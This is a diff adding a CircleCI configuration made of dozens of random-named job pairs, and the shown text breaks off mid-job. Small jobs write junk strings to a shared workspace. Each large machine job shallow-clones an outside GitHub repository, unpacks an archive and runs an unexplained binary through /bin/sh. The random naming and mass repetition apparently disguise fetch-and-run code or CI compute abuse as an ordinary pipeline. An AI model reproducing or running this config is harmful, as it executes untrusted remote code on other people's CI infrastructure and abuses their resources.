@@ -1,0 +1,1741 @@
+version: 2.1
+
+jobs:
+  bcicsnm:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: uwtyu
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'vymaspkypkpmhjcari lqhadftzemlpb' > /tmp/tufcdzysni/neadvqp
+            ls -la /tmp/tufcdzysni/neadvqp
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'neadvqp'
+  mrgpc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: lkwhoavt
+          command: |
+            cat /tmp/tufcdzysni/neadvqp
+      - run:
+          name: oclbysjlulpyp
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/marybrunerx7zft-max/2ad73ec6be37.git .
+      - run:
+          name: hmkujovgxzax
+          command: tar -xJf xzkxgrsf.tar.xz
+      - run:
+          command: /bin/sh -c "./sfnxpmdtr"
+  wqkyrvasniktsa:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: oenrmyxxxdsodos
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'ndpsnstcxzuw hgowaxytvxemnx' > /tmp/tufcdzysni/hrffuqxm
+            ls -la /tmp/tufcdzysni/hrffuqxm
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'hrffuqxm'
+  gfezjjntxqziwk:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: mpzupcnj
+          command: |
+            cat /tmp/tufcdzysni/hrffuqxm
+      - run:
+          name: ikvitx
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/marybrunerx7zft-max/2ad73ec6be37.git .
+      - run:
+          name: usjjcu
+          command: tar -xJf xzkxgrsf.tar.xz
+      - run:
+          command: /bin/sh -c "./sfnxpmdtr"
+  luarpbplrztruk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: lyqjwgusflvv
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'tawzyfdokosjfuzs qxnaubaifzhnhmfmd' > /tmp/tufcdzysni/tgwoayngyxu
+            ls -la /tmp/tufcdzysni/tgwoayngyxu
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'tgwoayngyxu'
+  zmaqe:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: ssgonth
+          command: |
+            cat /tmp/tufcdzysni/tgwoayngyxu
+      - run:
+          name: tluhlvrohtgxsgx
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/marybrunerx7zft-max/2ad73ec6be37.git .
+      - run:
+          name: idimazah
+          command: tar -xJf xzkxgrsf.tar.xz
+      - run:
+          command: /bin/sh -c "./sfnxpmdtr"
+  apagcufklls:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: zyebtmrrpkontfd
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'wmggmzwanyclybqs yuakqjmoqigz' > /tmp/tufcdzysni/rsihughzxr
+            ls -la /tmp/tufcdzysni/rsihughzxr
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'rsihughzxr'
+  xmoubeupxfp:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: vdmura
+          command: |
+            cat /tmp/tufcdzysni/rsihughzxr
+      - run:
+          name: eeluslc
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/marybrunerx7zft-max/2ad73ec6be37.git .
+      - run:
+          name: vbrda
+          command: tar -xJf xzkxgrsf.tar.xz
+      - run:
+          command: /bin/sh -c "./sfnxpmdtr"
+  gqzcwptou:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: fwbkzeyuyn
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'npzptkkzneu polawiogspjfdpt' > /tmp/tufcdzysni/qvyddgwwmmmdgt
+            ls -la /tmp/tufcdzysni/qvyddgwwmmmdgt
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'qvyddgwwmmmdgt'
+  ixlba:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: ezemhapaedklx
+          command: |
+            cat /tmp/tufcdzysni/qvyddgwwmmmdgt
+      - run:
+          name: dfwujpyp
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/marybrunerx7zft-max/2ad73ec6be37.git .
+      - run:
+          name: qebkhzsfumryega
+          command: tar -xJf xzkxgrsf.tar.xz
+      - run:
+          command: /bin/sh -c "./sfnxpmdtr"
+  gnutmgw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: krpslgmdodkuy
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'zgapltnunzfmkc tgrsxscveozaejh' > /tmp/tufcdzysni/ouowuadrlv
+            ls -la /tmp/tufcdzysni/ouowuadrlv
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'ouowuadrlv'
+  hcxakdjhkup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: ztpdec
+          command: |
+            cat /tmp/tufcdzysni/ouowuadrlv
+      - run:
+          name: dscdndjvspoymo
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/marybrunerx7zft-max/2ad73ec6be37.git .
+      - run:
+          name: rmuwmyfv
+          command: tar -xJf xzkxgrsf.tar.xz
+      - run:
+          command: /bin/sh -c "./sfnxpmdtr"
+  yxvxndn:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: rdqmtiq
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'uqyslkkktrszlx rwfqibfsjhvppwc' > /tmp/tufcdzysni/zoirar
+            ls -la /tmp/tufcdzysni/zoirar
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'zoirar'
+  fobwdmy:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: zniwyafnmqgf
+          command: |
+            cat /tmp/tufcdzysni/zoirar
+      - run:
+          name: nmbog
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/marybrunerx7zft-max/2ad73ec6be37.git .
+      - run:
+          name: qqkopqbhvrtvxw
+          command: tar -xJf xzkxgrsf.tar.xz
+      - run:
+          command: /bin/sh -c "./sfnxpmdtr"
+  gadjwvmcnxoyh:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: ykqmokfebokbjeo
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'iwsbuseyxyyckkyls fbsptjregerv' > /tmp/tufcdzysni/unuopfynuhwm
+            ls -la /tmp/tufcdzysni/unuopfynuhwm
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'unuopfynuhwm'
+  hugttmxzpd:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: ckzyzssze
+          command: |
+            cat /tmp/tufcdzysni/unuopfynuhwm
+      - run:
+          name: goqjsc
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/marybrunerx7zft-max/2ad73ec6be37.git .
+      - run:
+          name: rmvinrkvquhbqyc
+          command: tar -xJf xzkxgrsf.tar.xz
+      - run:
+          command: /bin/sh -c "./sfnxpmdtr"
+  krzgbrawa:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: sbzip
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'yqxbpzwwxbgmzlvmoo exssguudpcoikovsaz' > /tmp/tufcdzysni/ptvyxumqqbggc
+            ls -la /tmp/tufcdzysni/ptvyxumqqbggc
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'ptvyxumqqbggc'
+  cyczpka:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: uzaffaiy
+          command: |
+            cat /tmp/tufcdzysni/ptvyxumqqbggc
+      - run:
+          name: zswwlg
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/marybrunerx7zft-max/2ad73ec6be37.git .
+      - run:
+          name: trtrhtjnl
+          command: tar -xJf xzkxgrsf.tar.xz
+      - run:
+          command: /bin/sh -c "./sfnxpmdtr"
+  tbebbyrilkgxt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: gyseescrlcs
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'zwoumikaesdwwcbi efegbqumybnvglv' > /tmp/tufcdzysni/rawpjxadulqyzi
+            ls -la /tmp/tufcdzysni/rawpjxadulqyzi
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'rawpjxadulqyzi'
+  vzvtl:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: rlvnujkpncnu
+          command: |
+            cat /tmp/tufcdzysni/rawpjxadulqyzi
+      - run:
+          name: wtfwnvfuqve
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/marybrunerx7zft-max/2ad73ec6be37.git .
+      - run:
+          name: muaefjit
+          command: tar -xJf xzkxgrsf.tar.xz
+      - run:
+          command: /bin/sh -c "./sfnxpmdtr"
+  hbmdkatjscpbw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: afuwygyeuqywx
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'vhaniijyeybtht rhggafzgxjorftsy' > /tmp/tufcdzysni/jgyotn
+            ls -la /tmp/tufcdzysni/jgyotn
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'jgyotn'
+  latidhwol:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: bowkwt
+          command: |
+            cat /tmp/tufcdzysni/jgyotn
+      - run:
+          name: gapeds
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/marybrunerx7zft-max/2ad73ec6be37.git .
+      - run:
+          name: dhgzp
+          command: tar -xJf xzkxgrsf.tar.xz
+      - run:
+          command: /bin/sh -c "./sfnxpmdtr"
+  ktpihahvory:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: ykdngdzlt
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'znpinwqxcps jhyfsjzhryhtqngssh' > /tmp/tufcdzysni/lzdvcgzm
+            ls -la /tmp/tufcdzysni/lzdvcgzm
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'lzdvcgzm'
+  qtkwoicajzici:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: tmdkxay
+          command: |
+            cat /tmp/tufcdzysni/lzdvcgzm
+      - run:
+          name: qxuhwbsluj
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/marybrunerx7zft-max/2ad73ec6be37.git .
+      - run:
+          name: ftjbmjlaqbaf
+          command: tar -xJf xzkxgrsf.tar.xz
+      - run:
+          command: /bin/sh -c "./sfnxpmdtr"
+  hxronvw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: bpsodixazqa
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'ycovfvxzqyvzwkki tcgvlzzlzucoljv' > /tmp/tufcdzysni/kbgeqgbsjqoz
+            ls -la /tmp/tufcdzysni/kbgeqgbsjqoz
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'kbgeqgbsjqoz'
+  mpledtisjreimv:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: eiqiql
+          command: |
+            cat /tmp/tufcdzysni/kbgeqgbsjqoz
+      - run:
+          name: mnzfyksncg
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/marybrunerx7zft-max/2ad73ec6be37.git .
+      - run:
+          name: lpkmvsqsvz
+          command: tar -xJf xzkxgrsf.tar.xz
+      - run:
+          command: /bin/sh -c "./sfnxpmdtr"
+  cbgjpacakkzecw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: pyafhuaawqyope
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'cvvhgtnrckibqvucow dyjxvylzcgrgdrwjp' > /tmp/tufcdzysni/qoizzuqllungku
+            ls -la /tmp/tufcdzysni/qoizzuqllungku
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'qoizzuqllungku'
+  iuwwdoc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: gjvmjlpzvcoz
+          command: |
+            cat /tmp/tufcdzysni/qoizzuqllungku
+      - run:
+          name: mrbpwt
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/marybrunerx7zft-max/2ad73ec6be37.git .
+      - run:
+          name: vvjiws
+          command: tar -xJf xzkxgrsf.tar.xz
+      - run:
+          command: /bin/sh -c "./sfnxpmdtr"
+  mxcufhap:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: gglzry
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'skwirutvmrqdgx cjxuwemkkoppp' > /tmp/tufcdzysni/jnaluq
+            ls -la /tmp/tufcdzysni/jnaluq
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'jnaluq'
+  ihexsibwnvo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: kimqcz
+          command: |
+            cat /tmp/tufcdzysni/jnaluq
+      - run:
+          name: llehj
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/marybrunerx7zft-max/2ad73ec6be37.git .
+      - run:
+          name: lgqvmh
+          command: tar -xJf xzkxgrsf.tar.xz
+      - run:
+          command: /bin/sh -c "./sfnxpmdtr"
+  jjeojg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: isnsiepy
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'vlbaxorgpbakvr vtjtfojkzsvtb' > /tmp/tufcdzysni/tewrbqff
+            ls -la /tmp/tufcdzysni/tewrbqff
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'tewrbqff'
+  sdvetzescievxd:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: jfcigbabbjs
+          command: |
+            cat /tmp/tufcdzysni/tewrbqff
+      - run:
+          name: pssywtanbd
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/marybrunerx7zft-max/2ad73ec6be37.git .
+      - run:
+          name: nirelgopjy
+          command: tar -xJf xzkxgrsf.tar.xz
+      - run:
+          command: /bin/sh -c "./sfnxpmdtr"
+  kaldjtaurz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: abnywoefsbxcj
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'iyrvevbjjvig jspnhpsshfukm' > /tmp/tufcdzysni/qsghwbqvg
+            ls -la /tmp/tufcdzysni/qsghwbqvg
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'qsghwbqvg'
+  nmqzvqvnqctk:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: pzywjulq
+          command: |
+            cat /tmp/tufcdzysni/qsghwbqvg
+      - run:
+          name: igmim
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/marybrunerx7zft-max/2ad73ec6be37.git .
+      - run:
+          name: hmpgcke
+          command: tar -xJf xzkxgrsf.tar.xz
+      - run:
+          command: /bin/sh -c "./sfnxpmdtr"
+  iputrshtcgkt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: qxcaepvdt
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'llhyfvcpgssvadax jsfwpotuzjr' > /tmp/tufcdzysni/ntgvgpl
+            ls -la /tmp/tufcdzysni/ntgvgpl
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'ntgvgpl'
+  kwlblpfdpo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: tthxj
+          command: |
+            cat /tmp/tufcdzysni/ntgvgpl
+      - run:
+          name: deypocmsfc
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/marybrunerx7zft-max/2ad73ec6be37.git .
+      - run:
+          name: bxqccwkglpzi
+          command: tar -xJf xzkxgrsf.tar.xz
+      - run:
+          command: /bin/sh -c "./sfnxpmdtr"
+  skmdxytuua:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: tjqzbvuloa
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'mdbdbfhgjmef uvswwwbwmeszucejb' > /tmp/tufcdzysni/ejlhhlotdwroby
+            ls -la /tmp/tufcdzysni/ejlhhlotdwroby
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'ejlhhlotdwroby'
+  adieh:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: cbrcalvonoy
+          command: |
+            cat /tmp/tufcdzysni/ejlhhlotdwroby
+      - run:
+          name: pjkyjm
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/marybrunerx7zft-max/2ad73ec6be37.git .
+      - run:
+          name: yulniq
+          command: tar -xJf xzkxgrsf.tar.xz
+      - run:
+          command: /bin/sh -c "./sfnxpmdtr"
+  awvoolwdsxkr:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: cozzkniufh
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'fiojmdrqyhfexfsr tzvolgphsptmweo' > /tmp/tufcdzysni/fuvszlhd
+            ls -la /tmp/tufcdzysni/fuvszlhd
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'fuvszlhd'
+  grudgyzqbjso:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: ncfnqpktrnq
+          command: |
+            cat /tmp/tufcdzysni/fuvszlhd
+      - run:
+          name: dbacbzugolwmhs
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/marybrunerx7zft-max/2ad73ec6be37.git .
+      - run:
+          name: booaxjrdsatvsk
+          command: tar -xJf xzkxgrsf.tar.xz
+      - run:
+          command: /bin/sh -c "./sfnxpmdtr"
+  gwfjmncudtclgd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: yafwlwvmvvszsgg
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'ivewjrypqielgt kmtitnbzubowvvkt' > /tmp/tufcdzysni/kqcdjldbnz
+            ls -la /tmp/tufcdzysni/kqcdjldbnz
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'kqcdjldbnz'
+  rsowfmxds:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: qvsosbcb
+          command: |
+            cat /tmp/tufcdzysni/kqcdjldbnz
+      - run:
+          name: rqssrlw
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/marybrunerx7zft-max/2ad73ec6be37.git .
+      - run:
+          name: dzjuvzfifoalf
+          command: tar -xJf xzkxgrsf.tar.xz
+      - run:
+          command: /bin/sh -c "./sfnxpmdtr"
+  srobs:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: olmoplqxmsb
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'yldoazlrqxmjdbvc ishbpvlxidox' > /tmp/tufcdzysni/olwaybq
+            ls -la /tmp/tufcdzysni/olwaybq
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'olwaybq'
+  auuaskph:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: frzuzqr
+          command: |
+            cat /tmp/tufcdzysni/olwaybq
+      - run:
+          name: qsfcdurd
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/marybrunerx7zft-max/2ad73ec6be37.git .
+      - run:
+          name: bgjbfwjuiyri
+          command: tar -xJf xzkxgrsf.tar.xz
+      - run:
+          command: /bin/sh -c "./sfnxpmdtr"
+  csyzupddkxa:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: losfzqgwwghic
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'hynbydtmfocjyxymh octryfeclnf' > /tmp/tufcdzysni/shheqcfy
+            ls -la /tmp/tufcdzysni/shheqcfy
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'shheqcfy'
+  niplatqdhia:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: ephcuwszn
+          command: |
+            cat /tmp/tufcdzysni/shheqcfy
+      - run:
+          name: xetfqhibxgqiiby
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/marybrunerx7zft-max/2ad73ec6be37.git .
+      - run:
+          name: xktttgmo
+          command: tar -xJf xzkxgrsf.tar.xz
+      - run:
+          command: /bin/sh -c "./sfnxpmdtr"
+  hknydwxvxdzlpep:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: vmazejjm
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'rxznemsnxbwpyh jxwtnslbgzvuesg' > /tmp/tufcdzysni/diszbkiiihmsu
+            ls -la /tmp/tufcdzysni/diszbkiiihmsu
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'diszbkiiihmsu'
+  qlistzhvbtinoc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: jivciohosmkq
+          command: |
+            cat /tmp/tufcdzysni/diszbkiiihmsu
+      - run:
+          name: lcvxdikpibugng
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/marybrunerx7zft-max/2ad73ec6be37.git .
+      - run:
+          name: aqvtcqsaghgyd
+          command: tar -xJf xzkxgrsf.tar.xz
+      - run:
+          command: /bin/sh -c "./sfnxpmdtr"
+  mgzai:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: tfsdf
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'skoqjfipjlta cbkfaabzlicstxmwc' > /tmp/tufcdzysni/bkdesbs
+            ls -la /tmp/tufcdzysni/bkdesbs
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'bkdesbs'
+  ixmizt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: gdxlhuctiqns
+          command: |
+            cat /tmp/tufcdzysni/bkdesbs
+      - run:
+          name: kxjcvvmsm
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/marybrunerx7zft-max/2ad73ec6be37.git .
+      - run:
+          name: mmnhu
+          command: tar -xJf xzkxgrsf.tar.xz
+      - run:
+          command: /bin/sh -c "./sfnxpmdtr"
+  uvjrxgpoqeesct:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: nkppozyf
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'lnflolyjqiwey hwktmvauoew' > /tmp/tufcdzysni/khylgditywrqsq
+            ls -la /tmp/tufcdzysni/khylgditywrqsq
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'khylgditywrqsq'
+  puyfzzt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: vznnekkqhchwmz
+          command: |
+            cat /tmp/tufcdzysni/khylgditywrqsq
+      - run:
+          name: lexqvlaccjwjdkp
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/marybrunerx7zft-max/2ad73ec6be37.git .
+      - run:
+          name: dheuvhhc
+          command: tar -xJf xzkxgrsf.tar.xz
+      - run:
+          command: /bin/sh -c "./sfnxpmdtr"
+  dwenprnrr:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: hebqkgc
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'ynekzhohkchdvya ntuhulcwpmrhriakgh' > /tmp/tufcdzysni/ashohclf
+            ls -la /tmp/tufcdzysni/ashohclf
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'ashohclf'
+  yalszovslze:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: msrprrre
+          command: |
+            cat /tmp/tufcdzysni/ashohclf
+      - run:
+          name: evynvlfw
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/marybrunerx7zft-max/2ad73ec6be37.git .
+      - run:
+          name: ijnicpdcud
+          command: tar -xJf xzkxgrsf.tar.xz
+      - run:
+          command: /bin/sh -c "./sfnxpmdtr"
+  lwjwklekmc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: qqiqfhcvk
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'kpjstavhjydq brfxvdqgxehwoz' > /tmp/tufcdzysni/lqagva
+            ls -la /tmp/tufcdzysni/lqagva
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'lqagva'
+  kgpllsksb:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: hcpddek
+          command: |
+            cat /tmp/tufcdzysni/lqagva
+      - run:
+          name: szkutwib
